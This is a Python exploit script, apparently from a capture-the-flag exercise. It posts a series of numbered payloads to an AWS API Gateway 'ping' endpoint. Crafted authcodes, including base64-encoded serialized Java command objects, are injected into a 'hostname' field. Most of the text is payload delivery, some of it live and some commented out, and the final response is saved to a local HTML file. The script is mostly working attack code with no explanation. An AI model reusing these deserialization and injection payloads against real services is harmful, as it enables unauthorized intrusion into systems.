    #payload_11["hostname"] = payload_11["hostname"].replace("YYYYYYYYYY", authcode)
    #r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_11, headers=headers)
    #print(r.status_code)
    #print(r.text)

    print("========== payload 12 ==========")
    authcode = "rn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8Ov5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/YhKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94F0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV1JZoKNni+goINz1b1E9o8w=="
    print(payload_12)
    payload_12["hostname"] = payload_12["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    payload_12["hostname"] = payload_12["hostname"].replace("YYYYYYYYYY", authcode)
    #print(payload_12)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_12, headers=headers)
    print(r.status_code)
    print(r.text)


    #print("========== payload 13 ======= Erica TEST ===")
    #authcode = "rn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8Ov5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/YhKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94F0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV1JZoKNni+goINz1b1E9o8w=="
    #print(payload_13)
    #payload_13["hostname"] = payload_13["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    #payload_13["hostname"] = payload_13["hostname"].replace("YYYYYYYYYY", authcode)
    #print(payload_13)
    #r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_13, headers=headers)
    #print(r.status_code)
    #print(r.text)


    #print("========== payload 13.5 =======Yi SYuan said use authcode play again ===")
    #authcode = "rO0ABXNyAA5zZXJpYWwuQ29tbWFuZIJYpr6zsellAgAETAAIYXJndW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZztbAAhhdXRoQ29kZXQAAltCTAAGdGFyZ2V0cQB+AAFMAAR0eXBldAAUTHNlcmlhbC9Db21tYW5kVHlwZTt4cHQAAHVyAAJbQqzzF/gGCFTgAgAAeHAAAAEArn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8Ov5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/YhKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94F0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV1JZoKNni+goINz1b1E9o83QAAH5yABJzZXJpYWwuQ29tbWFuZFR5cGUAAAAAAAAAABIAAHhyAA5qYXZhLmxhbmcuRW51bQAAAAAAAAAAEgAAeHB0AARTVE9Q"
    #print(payload_135)
    #payload_135["hostname"] = payload_135["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    #payload_135["hostname"] = payload_135["hostname"].replace("YYYYYYYYYY", authcode)
    #print(payload_135)
    #r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_135, headers=headers)
    #print(r.status_code)
    #print(r.text)

    #print("========== payload 14 ===== Test for wired authcode =====")
    #finalauthcode = "rO0ABXNyAA5zZXJpYWwuQ29tbWFuZIJYpr6zsellAgAETAAIYXJndW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZztbAAhhdXRoQ29kZXQAAltCTAAGdGFyZ2V0cQB+AAFMAAR0eXBldAAUTHNlcmlhbC9Db21tYW5kVHlwZTt4cHQAAHVyAAJbQqzzF/gGCFTgAgAAeHAAAAHjrO0ABXNyAA5zZXJpYWwuQ29tbWFuZIJYpr6zsellAgAETAAIYXJndW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZztbAAhhdXRoQ29kZXQAAltCTAAGdGFyZ2V0cQB+AAFMAAR0eXBldAAUTHNlcmlhbC9Db21tYW5kVHlwZTt4cHQAAHVyAAJbQqzzF/gGCFTgAgAAeHAAAAEArn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8Ov5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/YhKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94F0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV1JZoKNni+goINz1b1E9o83QAAH5yABJzZXJpYWwuQ29tbWFuZFR5cGUAAAAAAAAAABIAAHhyAA5qYXZhLmxhbmcuRW51bQAAAAAAAAAAEgAAeHB0AARTVE9QdAAAfnIAEnNlcmlhbC5Db21tYW5kVHlwZQAAAAAAAAAAEgAAeHIADmphdmEubGFuZy5FbnVtAAAAAAAAAAASAAB4cHQABFNUT1A="
    #print(payload_14)
    #payload_14["hostname"] = payload_14["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    #payload_14["hostname"] = payload_14["hostname"].replace("YYYYYYYYYY", finalauthcode)
    #print(payload_14)
    #r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_14, headers=headers)
    #print(r.status_code)
    #print(r.text)

    print("========== payload 15 ==========")
    finalauthcode = "rO0ABXNyAA5zZXJpYWwuQ29tbWFuZIJYpr6zsellAgAETAAIYXJndW1lbnR0ABJMamF2YS9sYW5nL1N0cmluZztbAAhhdXRoQ29kZXQAAltCTAAGdGFyZ2V0cQB+AAFMAAR0eXBldAAUTHNlcmlhbC9Db21tYW5kVHlwZTt4cHQAAHVyAAJbQqzzF/gGCFTgAgAAeHAAAAEArn2Qwyc6M4yw0C59ViH610mJqTmRusIGFzEqfVKpoIwUApFwrzpyAV0C5ehi8xI8Ov5/wPdpu9BDQO9iNa9Nb5VZgOPO2ieunGDd2pOFdo+65ADhaAb9EIlbhsAuQ/YhKXSTenBBGfgccNdkW/sZ5S7LeVhpMW9XFkx08PKLBIeimpVPPJQyMWn13HK0Vixe6dIs1L0DPwnj9wkuUtgP25U1lop2hE2yHu5yUsWSWiOesCh3UR9jNWg2G9f7em94F0w9Qls9xTQhkh2Ni1WRQYoqFUOuAA9fj2Lm9ITx4/i2VFIx7Bptx6cBkfa8aDUV1JZoKNni+goINz1b1E9o83QAAH5yABJzZXJpYWwuQ29tbWFuZFR5cGUAAAAAAAAAABIAAHhyAA5qYXZhLmxhbmcuRW51bQAAAAAAAAAAEgAAeHB0AARTVE9Q"
    print(payload_15)
    payload_15["hostname"] = payload_15["hostname"].replace("ZZZZZZZZZZ", sessionid01)
    payload_15["hostname"] = payload_15["hostname"].replace("YYYYYYYYYY", finalauthcode)
    print(payload_15)
    r = requests.post('https://k7vo268tif.execute-api.us-east-1.amazonaws.com/prod/ping/', json=payload_15, headers=headers)
    print(r.status_code)
    print(r.text)



    htmlwirter(r.text)




def htmlwirter(content):
    open('web.html','w').write(content)


if __name__=="__main__":
    rockman()